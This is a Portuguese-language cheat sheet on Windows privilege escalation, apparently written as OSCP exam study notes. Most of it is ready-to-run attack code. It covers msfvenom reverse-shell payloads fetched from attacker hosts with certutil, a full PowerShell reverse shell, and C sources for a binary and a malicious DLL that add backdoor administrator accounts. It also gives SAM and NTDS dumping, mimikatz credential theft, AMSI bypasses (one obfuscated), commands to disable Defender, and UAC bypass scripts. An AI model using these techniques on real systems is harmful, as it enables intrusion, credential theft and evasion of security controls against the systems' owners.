# Escalação de Privilégios Windows

## Índice

- [Enumeração](#enumeração)
- [Exploração de Serviços](#exploração-de-serviços)
- [Potato Exploits](#potato-exploits) ➜ [Guia Detalhado](Potato-Exploits.md)
- [Abuso de SeBackupPrivilege](#abuso-de-sebackupprivilege)
- [Credenciais no Registro](#credenciais-no-registro)
- [Caça a Credenciais](#caça-a-credenciais)
- [Ferramentas de Enumeração](#ferramentas-de-enumeração) ➜ [Guia Detalhado](Windows-PrivEsc-Tools.md)
- [AlwaysInstallElevated](#alwaysinstallelevated)
- [Tarefas Agendadas](#tarefas-agendadas)
- [DLL Hijacking](#dll-hijacking)
- [Evasão de AV](#evasão-de-av)
- [Exploração de Armazenamento de Credenciais](#exploração-de-armazenamento-de-credenciais)
- [Bypass de UAC](#bypass-de-uac)
- [Veja Também](#veja-também)

---

## Enumeração

### Enumeração Rápida (One-liner)

```cmd
:: Informações completas do sistema
systeminfo && whoami /all && net users && net localgroup administrators

:: Verificar privilégios exploráveis
whoami /priv | findstr /i "SeImpersonate SeAssignPrimary SeBackup SeRestore SeTakeOwnership SeDebug"
```

```powershell
# One-liner de enumeração PowerShell
$p=whoami /priv;if($p-match'SeImpersonate'){Write-Host '[!] Potato Exploit possível!' -ForegroundColor Red}
```

### Verificações de Usuário e Privilégio

| Privilégio | Exploração |
| :--- | :--- |
| SeImpersonatePrivilege | Potato Exploits (SigmaPotato, GodPotato) |
| SeAssignPrimaryTokenPrivilege | Potato Exploits |
| SeBackupPrivilege | Dump SAM/SYSTEM, copiar arquivos protegidos |
| SeRestorePrivilege | Sobrescrever arquivos protegidos |
| SeTakeOwnershipPrivilege | Tomar posse de qualquer arquivo |
| SeDebugPrivilege | Injetar em processos |

---

## Exploração de Serviços

### Caminho de Serviço sem Aspas (One-liner)

```cmd
:: Encontrar caminhos de serviço sem aspas
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """"
```

> Se o caminho do serviço tem espaço e não tem aspas

```shell
# Atacante

msfvenom -p windows/x64/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o Service.exe 

msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/shell/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit -j'

python -m http.server 80

# Vítima

sc qc servico_vulneravel

C:\Program Files\Vuln\Service.exe

certutil -urlcache -split -f "http://$lhost/reverse.exe" "C:\Program Files\Vuln\Service.exe"

sc stop servico_vulneravel

sc start servico_vulneravel
```

---

### Permissões Fracas em Serviços

```cmd
# Atacante

msfvenom -p windows/x64/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o reverse.exe 

msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/shell/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit -j'

python -m http.server 80

# Vítima

accesschk.exe /accepteula -uwcqv "Everyone" "nome_do_servico"

certutil -urlcache -split -f "http://192.168.45.187/reverse.exe" "C:\reverse.exe"

sc config nome_do_servico binpath= "C:\reverse.exe"

sc start nome_do_servico
```

---

### Sequestro de Binário de Serviço

#### Exemplo: xampp (mysql)

```c
#include <stdlib.h>
int main ()
{
int i;
i = system ("net user ar3mus password123! /add");
i = system ("net localgroup administrators ar3mus /add");
return 0;
}
```

```shell
# Atacante
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

python -m http.server 80

# Vítima

powershell -ep bypass

iwr -uri http://192.168.45.183/adduser.exe -Outfile adduser.exe

icacls "C:\xampp\mysql\bin\mysqld.exe"

move C:\xampp\mysql\bin\mysqld.exe mysqld.exe.bak

move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

whoami /priv

shutdown /r /t 0

# Verificar se novo usuário foi criado após reinicialização
net user
```

---

## Potato Exploits

> Usado quando `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege` está habilitado

**📖 Veja o guia completo: [Potato-Exploits.md](Potato-Exploits.md)**

| Ferramenta | Versão do Windows | Comando Rápido |
| --- | --- | --- |
| SigmaPotato | Windows Moderno | `.\SigmaPotato.exe --revshell $lhost $lport` |
| GodPotato | Todas as versões | `.\GodPotato.exe -cmd "cmd /c whoami"` |
| PrintSpoofer | Server 2016/2019 | `.\PrintSpoofer.exe -i -c cmd` |

### Verificação Rápida

```cmd
whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"
```

---

## Abuso de SeBackupPrivilege

> Usado para dump de SAM/SYSTEM ou copiar arquivos protegidos

### Verificar Privilégio

```cmd
whoami /priv | findstr SeBackupPrivilege
```

### Dump de SAM e SYSTEM

```cmd
# Criar backup dos hives do registro
reg save HKLM\SAM C:\Users\Public\SAM
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM

# Transferir para a máquina atacante (via Evil-WinRM)
download SAM
download SYSTEM

# No Kali - Extrair hashes
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### Dump de NTDS.dit (Controlador de Domínio)

```powershell
# Habilitar SeBackupPrivilege na sessão atual
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege

# Criar shadow copy
$shadow = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\", "ClientAccessible")
$shadowPath = (Get-WmiObject Win32_ShadowCopy | Sort-Object InstallDate -Descending)[0].DeviceObject

# Copiar NTDS.dit da shadow
Copy-FileSeBackupPrivilege "$shadowPath\Windows\NTDS\ntds.dit" C:\Users\Public\ntds.dit

# Copiar hive SYSTEM
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM
```

### Alternativa com Robocopy

```cmd
# Robocopy em modo backup para copiar arquivos protegidos
robocopy /B C:\Windows\NTDS C:\Users\Public ntds.dit
```

---

## Credenciais no Registro

### Credenciais de Auto Logon

> O Windows pode armazenar credenciais de logon automático no registro

```cmd
# Verificar credenciais de auto-logon armazenadas
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName

# One-liner para obter tudo
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword DefaultDomainName"
```

```powershell
# PowerShell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | 
  Select-Object DefaultUserName, DefaultPassword, DefaultDomainName
```

### Credenciais Salvas

```cmd
# Listar credenciais salvas
cmdkey /list

# Se houver credenciais salvas, usar runas
runas /savecred /user:Administrator cmd.exe
```

### Sessões Salvas do PuTTY

```cmd
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### Senhas do VNC

```cmd
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password
```

---

## Caça a Credenciais

### Busca Rápida de Arquivos (One-liner)

```cmd
:: CMD - Buscar extensões interessantes
for %e in (txt xml ini config json yaml yml conf cfg env bak old log rdp vnc ppk pem kdbx db sqlite) do @dir /s /b C:\Users\*.%e 2>nul
```

```powershell
# PowerShell - Buscar extensões interessantes
"txt","xml","ini","config","json","yaml","yml","conf","cfg","env","bak","old","log","rdp","vnc","ppk","pem","kdbx","db" | %{ gci C:\Users -Recurse -Filter "*.$_" -EA 0 } | select FullName
```

### Buscar em Todo o Drive

```cmd
:: Buscar em C:\ (mais lento mas completo)
for %e in (txt xml ini config json yaml yml conf cfg env bak old log rdp vnc ppk pem kdbx) do @dir /s /b C:\*.%e 2>nul
```

```powershell
# PowerShell - drive completo
"txt","xml","ini","config","json","yaml","yml","conf","cfg","env","bak","old","log","rdp","vnc","ppk","pem","kdbx" | %{ gci C:\ -Recurse -Filter "*.$_" -EA 0 } | select FullName
```

### Buscar Senhas em Arquivos

```cmd
# Buscar em tipos comuns de arquivo
findstr /si password *.txt *.ini *.xml *.config *.cfg
findstr /spin "password" *.*

# Buscar no drive inteiro
dir /s /b *pass*.txt *cred*.txt *vnc*.ini *.config
```

```powershell
# Busca recursiva com PowerShell
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.xml,*.config -Recurse -ErrorAction SilentlyContinue |
  Select-String -Pattern "password|pwd|pass" -ErrorAction SilentlyContinue
```

### Buscar Arquivos por Padrão de Nome

```cmd
:: Encontrar arquivos com password/cred/secret no nome
dir /s /b C:\Users\*pass* C:\Users\*cred* C:\Users\*secret* C:\Users\*key* C:\Users\*token* 2>nul
```

```powershell
# PowerShell - encontrar por padrão de nome
gci C:\Users -Recurse -EA 0 | ?{ $_.Name -match "pass|cred|secret|login|key|token|backup" } | select FullName
```

### Localizações Comuns de Credenciais

```cmd
# Arquivos Unattend (senhas de instalação)
type C:\Windows\Panther\Unattend.xml 2>nul
type C:\Windows\Panther\Unattended.xml 2>nul
type C:\Windows\Panther\UnattendGC\Unattend.xml 2>nul

# Arquivos de config web
type C:\inetpub\wwwroot\web.config 2>nul
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config 2>nul

# Arquivos McAfee
type C:\ProgramData\McAfee\Common Framework\SiteList.xml 2>nul

# VNC
type C:\Users\*\.vnc\passwd 2>nul
type C:\Program Files\UltraVNC\ultravnc.ini 2>nul
```

### Histórico do PowerShell

```powershell
# Histórico do usuário atual
type (Get-PSReadLineOption).HistorySavePath

# Histórico de todos os usuários
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue | 
  ForEach-Object { Write-Output "=== $_ ==="; Get-Content $_ }
```

### Senhas de Wi-Fi

```cmd
# Listar perfis Wi-Fi salvos
netsh wlan show profiles

# Obter senha de perfil específico
netsh wlan show profile name="NomeDoPerfil" key=clear
```

### Credenciais Protegidas por DPAPI

```cmd
# Listar credenciais DPAPI
dir C:\Users\*\AppData\Local\Microsoft\Credentials\* 2>nul
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\* 2>nul

# Usar mimikatz para descriptografar
mimikatz.exe
sekurlsa::dpapi
dpapi::cred /in:C:\Users\usuario\AppData\Local\Microsoft\Credentials\GUID
```

---

## Ferramentas de Enumeração

**📖 Veja o guia detalhado: [Windows-PrivEsc-Tools.md](Windows-PrivEsc-Tools.md)**

| Ferramenta | Comando | Finalidade |
| --- | --- | --- |
| winPEAS | `.\winPEASx64.exe` | Enumeração abrangente |
| PowerUp | `Invoke-AllChecks` | Verificações de serviço/privilégio |
| PrivescCheck | `Invoke-PrivescCheck` | Alternativa moderna ao PowerUp |
| Seatbelt | `.\Seatbelt.exe -group=all` | Reconhecimento de segurança |

---

## AlwaysInstallElevated

> As chaves de registro devem estar definidas como 1

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Exploração

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f msi -o malicioso.msi
```

```cmd
msiexec /quiet /qn /i malicioso.msi
```

---

## Tarefas Agendadas

### Enumerar Tarefas Agendadas

```cmd
# Listar todas as tarefas agendadas
schtasks /query /fo LIST /v

# Filtrar por nome da tarefa
schtasks /query /fo LIST | findstr "TaskName"

# Consultar tarefa específica
schtasks /query /tn "\Microsoft\NomeDaTarefa" /v /fo list
```

#### Enumeração com PowerShell

```powershell
# Listar tarefas não-Microsoft (tarefas customizadas)
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft\*' }

# Obter detalhes com ações
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft\*' } | 
  ForEach-Object { 
    $task = $_
    $actions = $task | Get-ScheduledTaskInfo
    [PSCustomObject]@{
      NomeTarefa = $task.TaskName
      CaminhoTarefa = $task.TaskPath
      Estado = $task.State
      UserId = $task.Principal.UserId
    }
  } | Format-Table -AutoSize

# Obter ação da tarefa (caminho do executável)
(Get-ScheduledTask -TaskName "NomeDaTarefa").Actions
```

### Encontrar Scripts de Tarefas Graváveis

```cmd
# Verificar permissões no script da tarefa
icacls "C:\Caminho\Para\Script.bat"
icacls "C:\Caminho\Para\Script.ps1"
```

### Exploração

```powershell
# Se o script for gravável, substituir por reverse shell
# Editar o arquivo de script
notepad C:\Caminho\Para\Script.ps1

# Adicionar reverse shell PowerShell
$LHOST = "$lhost"
$LPORT = 4444
$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)
$NetworkStream = $TCPClient.GetStream()
$StreamReader = New-Object IO.StreamReader($NetworkStream)
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
$StreamWriter.AutoFlush = $true
$Buffer = New-Object System.Byte[] 1024
while ($TCPClient.Connected) {
  while ($NetworkStream.DataAvailable) {
    $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
    $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1)
  }
  if ($TCPClient.Connected -and $Code.Length -gt 1) {
    $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }
    $StreamWriter.Write("$Output`n")
    $Code = $null
  }
}
$TCPClient.Close()
```

```shell
# No Kali - aguardar a tarefa executar
nc -lvnp 4444
```

---

## DLL Hijacking

### Detecção com Procmon

```cmd
# Encontrar DLLs ausentes
procmon.exe    # Filtro: Result = NAME NOT FOUND, Path termina com .dll
```

### Enumeração de Serviços com PowerShell

```powershell
# Listar serviços com caminhos (excluir svchost)
Get-CimInstance -ClassName Win32_Service | 
  Where-Object { $_.PathName -and ($_.PathName -notmatch 'svchost.exe') } | 
  Select-Object Name, DisplayName, StartName, PathName | 
  Format-Table -AutoSize

# Encontrar serviços rodando como SYSTEM
Get-WmiObject -Class Win32_Service | 
  Where-Object { 
    $_.StartName -match "LocalSystem|NT AUTHORITY\\SYSTEM" -and 
    $_.PathName -and 
    ($_.PathName -notmatch 'svchost\.exe') 
  } | 
  Select-Object Name, DisplayName, PathName | 
  Format-Table -AutoSize
```

### Encontrar Diretórios Graváveis no PATH

```powershell
# Verificar pastas graváveis no PATH (abuso de ordem de busca de DLL)
$env:Path.Split(';') | ForEach-Object {
  $p = $_.Trim()
  if ($p -and (Test-Path $p)) {
    $acl = (icacls $p) -join "`n"
    if ($acl -match 'Users.*M' -or $acl -match 'Everyone.*M') {
      [PSCustomObject]@{ Caminho = $p; ACL = $acl }
    }
  }
} | Format-Table -AutoSize
```

### Encontrar Diretórios de Serviço Graváveis

```powershell
# Encontrar pastas de serviço graváveis por usuários
Get-WmiObject -Class Win32_Service | ForEach-Object {
  $svc = $_
  if (-not $svc.PathName) { return }
  $exe = ($svc.PathName -replace '"','').Split(' ')[0]
  if (-not $exe) { return }
  $pasta = Split-Path $exe -ErrorAction SilentlyContinue
  if (-not $pasta -or -not (Test-Path $pasta)) { return }
  if ($pasta -match [regex]::Escape($env:windir) -and $pasta -match 'System32') { return }
  try { $aclText = icacls $pasta 2>$null } catch { $aclText = $null }
  if ($aclText -and ($aclText -match 'Users.*M' -or $aclText -match 'Everyone.*M')) {
    [PSCustomObject]@{
      Servico = $svc.Name
      CaminhoExe = $exe
      Pasta = $pasta
    }
  }
} | Format-Table -AutoSize
```

### Criar DLL Maliciosa

```c
// maliciosa.c - Adicionar usuário ao grupo de administradores
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        system("net user backdoor Password123! /add");
        system("net localgroup administrators backdoor /add");
    }
    return TRUE;
}
```

#### Criar DLL com Reverse Shell

```c
// revshell.c - Executar reverse shell
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        system("powershell -e <PAYLOAD_BASE64>");
    }
    return TRUE;
}
```

### Compilar DLL

```shell
# Instalar MinGW no Kali
sudo apt install mingw-w64

# Compilar DLL x64
x86_64-w64-mingw32-gcc -shared -o maliciosa.dll maliciosa.c -O2 -s

# Compilar DLL x86
i686-w64-mingw32-gcc -shared -o maliciosa.dll maliciosa.c -O2 -s

# Verificar DLL
file maliciosa.dll  # Deve mostrar PE32+ (DLL) x86-64
```

### Passos de Exploração

```shell
# 1. Transferir DLL para o alvo
python -m http.server 80

# 2. No alvo - baixar e posicionar a DLL
certutil -urlcache -split -f "http://$lhost/maliciosa.dll" "C:\AppVulneravel\dll_ausente.dll"

# 3. Reiniciar serviço ou aguardar aplicação carregar a DLL
sc stop ServicoVulneravel
sc start ServicoVulneravel

# 4. Conectar com o novo usuário admin
impacket-psexec backdoor:Password123!@$rhost
```

---

## Evasão de AV

> Técnicas para contornar Windows Defender e detecção de AV

### ThreatChecker

> Identifica quais bytes do arquivo disparam a detecção do AV

```shell
# Baixar do GitHub
# https://github.com/rasta-mouse/ThreatCheck

# Verificar arquivo contra assinaturas AV
ThreatChecker.exe -f payload.exe

# Verificar com engine específica
ThreatChecker.exe -f payload.exe -e AMSI
ThreatChecker.exe -f payload.exe -e Defender

# A saída mostra o offset de bytes da detecção
# Use para modificar partes específicas do payload
```

### DefenderCheck

```shell
# Ferramenta similar para o Defender
DefenderCheck.exe payload.exe
```

### Técnicas de Ofuscação

#### Bypass de AMSI

```powershell
# Bypass de AMSI PowerShell (Matt Graeber)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# One-liner (codificado)
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

#### Desativar Defender (Requer Admin)

```cmd
:: Desativar proteção em tempo real
Set-MpPreference -DisableRealtimeMonitoring $true

:: Adicionar exclusão de caminho
Set-MpPreference -ExclusionPath "C:\Temp"

:: Adicionar exclusão de processo
Set-MpPreference -ExclusionProcess "mimikatz.exe"
```

#### Modificação de Payload

```shell
# Codificação Shikata Ga Nai (múltiplas iterações)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=4444 \
  -e x64/xor_dynamic -i 5 -f exe -o payload.exe

# Alterar entry point
# Modificar metadados
# Adicionar seções de código benigno
```

---

## Exploração de Armazenamento de Credenciais

### Localizações do Windows Credential Manager

> Dump de credenciais armazenadas no Windows Vault

```powershell
# Listar todas as credenciais armazenadas
cmdkey /list
```

> Exportar credenciais armazenadas (requer credenciais no vault)

```powershell
# Acessar credenciais programaticamente
$cred = New-Object System.Management.Automation.PSCredential("dominio\usuario", (ConvertTo-SecureString "senha" -AsPlainText -Force))
```

### Extração de Histórico do PowerShell

> Verificar arquivo de histórico do PowerShell

```powershell
type $PROFILE\PSReadline\ConsoleHost_history.txt
```

> Buscar senhas no histórico

```powershell
Get-History | Where-Object {$_.CommandLine -match "password|pwd|pass"} | Select-Object CommandLine
```

> Ou verificar diretamente o arquivo de histórico

```powershell
type "C:\Users\$username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
```

### Armazenamento de Credenciais no Registro

> Dump de credenciais AutoLogon

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
```

> Obter credenciais RDP do registro

```powershell
reg query "HKCU\Software\Microsoft\Terminal Server Client\Default" /s
```

> Verificar credenciais em cache

```powershell
reg query "HKLM\Security\Cache" 
```

### Armazenamento de Credenciais em Arquivo

> Buscar unattend.xml com credenciais

```powershell
dir C:\Windows\Panther\ -Recurse -Filter unattend.xml
Get-ChildItem "C:\Windows\Panther\" -Recurse -Filter "*.xml" | type
```

> Procurar sysprep.inf

```powershell
type "C:\Windows\System32\sysprep\sysprep.inf"
type "C:\Windows\sysprep.inf"
```

> Buscar localizações comuns de credenciais em arquivo

```powershell
# .git-credentials
type "C:\Users\$username\.git-credentials"

# Chaves SSH
dir "C:\Users\$username\.ssh\" -File

# Arquivos de conexão RDP
dir "C:\Users\$username\AppData\Local\Microsoft\Terminal Server Client\" -Recurse
```

> Buscar senhas hardcoded em arquivos de configuração

```powershell
Get-ChildItem -Path "C:\Program Files" -Recurse -Filter "*.config" -ErrorAction SilentlyContinue | 
  Select-String -Pattern "password|pwd|secret" | Select-Object Path, Line
```

### Credenciais de VNC e Ferramentas Remotas

> Extrair senha do VNC

```powershell
reg query "HKCU\Software\RealVNC\vncserver" /v Password

# Se criptografada, extrair do registro binário
$key = (Get-ItemProperty 'HKCU:\Software\RealVNC\vncserver').Password
# Descriptografar com algoritmo conhecido do VNC
```

> Senha armazenada do TightVNC

```powershell
reg query "HKCU\Software\TightVNC" /s
```

> Senha do UltraVNC

```powershell
reg query "HKCU\Software\UltraVNC" /s
```

### Descriptografia de Credenciais Protegidas por DPAPI

> Encontrar dados protegidos por DPAPI

```powershell
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
```

> Descriptografar com DPAPI (se houver sessão do usuário)

```powershell
Add-Type -AssemblyName System.Security
$dpapi = New-Object System.Security.Cryptography.DataProtectionScope
$encryptedBytes = [Convert]::FromBase64String("STRING_CRIPTOGRAFADA_BASE64")
$decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, $dpapi.CurrentUser)
[System.Text.Encoding]::Unicode.GetString($decryptedBytes)
```

### Extração de Credenciais do IIS

> Dump de credenciais AppPool do IIS

```powershell
# Obter identidade AppPool
Get-WmiObject IIsApplicationPool -Namespace 'root\microsoftiis' | Select-Object Name, AppPoolIdentity

# Extrair da metabase do IIS
type "C:\Windows\System32\inetsrv\MetaBase.xml" | findstr /S "password"
```

> Verificar logs do IIS por vazamento de credenciais

```powershell
type "C:\inetpub\logs\LogFiles\W3SVC1\*" | findstr "password|pwd|user="
```

### Dump de Credenciais via Task Scheduler

> Listar tarefas agendadas e proprietários

```powershell
Get-ScheduledTask | Where-Object {$_.Principal.UserId -ne "NT AUTHORITY\SYSTEM"} | 
  Select-Object TaskName, @{N="Usuario";E={$_.Principal.UserId}}
```

> Extrair XML da tarefa (pode conter credenciais embutidas)

```powershell
$task = Get-ScheduledTask -TaskName "NomeDaTarefa"
Export-ScheduledTask -TaskName $task.TaskName -TaskPath $task.TaskPath | Out-File task.xml
type task.xml | findstr "password"
```

### Credenciais WinRM/Execução Remota

> Verificar hosts confiáveis do WinRM

```powershell
Get-WSManCredSSP
```

> Listar tickets Kerberos em cache

```powershell
klist
klist tickets
```

> Dump de credenciais do LSASS (requer SYSTEM)

```powershell
# Usando mimikatz
mimikatz # sekurlsa::logonpasswords

# Ou usar LaZagne
.\LaZagne.exe all
```

---

## Bypass de UAC

> Técnicas de bypass do User Account Control para escalação de médio para alto nível de integridade

### Verificar Status do UAC

```cmd
:: Verificar configurações do UAC
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

| ConsentPromptBehaviorAdmin | Descrição |
|---------------------------|-------------|
| 0 | Sem prompt (UAC desativado para admins) |
| 1 | Prompt na área de trabalho segura |
| 2 | Prompt (sem área de trabalho segura) |
| 5 | Padrão — Prompt para binários não-Windows |

### Bypass UAC via Fodhelper

> Funciona no Windows 10, requer usuário local admin no grupo Administrators

```cmd
:: Definir chave de registro para executar nosso payload
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Windows\Temp\shell.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f

:: Disparar o bypass
fodhelper.exe

:: Limpeza
reg delete HKCU\Software\Classes\ms-settings /f
```

### Bypass UAC via Eventvwr

> Funciona no Windows 7/8/10

```cmd
:: Definir chave de registro
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "C:\Windows\Temp\shell.exe" /f

:: Disparar o bypass
eventvwr.exe

:: Limpeza
reg delete HKCU\Software\Classes\mscfile /f
```

### Bypass UAC via ComputerDefaults

```cmd
:: Definir chave de registro
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe /c C:\Windows\Temp\shell.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f

:: Disparar
computerdefaults.exe

:: Limpeza
reg delete HKCU\Software\Classes\ms-settings /f
```

### Ferramenta UACME

> <https://github.com/hfiref0x/UACME>

```cmd
:: Usar método 23 (fodhelper)
Akagi64.exe 23 C:\Windows\Temp\shell.exe

:: Usar método 33 (sdclt)
Akagi64.exe 33 C:\Windows\Temp\shell.exe
```

### Script PowerShell de Bypass

```powershell
# Bypass via Fodhelper
function Invoke-FodhelperBypass {
    param([string]$Comando)
    
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $Comando -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Force
    
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 3
    
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
}

# Uso
Invoke-FodhelperBypass -Comando "cmd.exe /c C:\Windows\Temp\shell.exe"
```

---

## Veja Também

- **[Exploração AD](../3.AD-Exploit/3.1.AD-Exploitation.md)** — Caminhos de escalação de privilégios específicos do AD
- **[Ataques Kerberos](../3.AD-Exploit/3.3.Kerberos-Attacks.md)** — Kerberoasting, ASREPRoast, Golden/Silver tickets
- **[NTLM Relay](../3.AD-Exploit/3.4.NTLM-Relay-and-Responder.md)** — NTLM relay e ataques com Responder
- **[Ataques de Senha](../3.AD-Exploit/3.2.Password-Attacks.md)** — mimikatz, LaZagne, extração de credenciais
- **[Movimentação Lateral](../5.Lateral-Movement/5.1.Lateral-Movement.md)** — Mover após escalação
- **[Pivoting com Ligolo-ng](../5.Lateral-Movement/5.3.Ligolo-ng-Complete-Guide.md)** — Tunnel via máquinas comprometidas
- **[Guia do Exame OSCP - Windows PrivEsc](../9.OSCP-Exam/9.1.OSCP-Exam-Guide.md)** — Referência rápida
